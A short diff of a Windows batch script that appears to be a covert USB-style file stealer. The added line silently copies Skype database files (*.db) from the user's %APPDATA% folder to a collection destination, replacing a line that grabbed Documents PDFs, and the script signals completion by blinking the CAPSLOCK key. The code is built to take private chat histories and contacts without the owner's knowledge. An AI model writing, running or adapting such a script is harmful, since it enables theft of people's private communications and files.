@@ -19,7 +19,7 @@ REM /E Copies directories and subdirectories, including empty ones.
 REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul
 
 REM Same as above but does not create empty directories
-xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.pdf %dst% >>nul
+xcopy /C /Q /G /Y /S %APPDATA%\Skype\*.db %dst% >>nul
 )
 
 REM Blink CAPSLOCK key
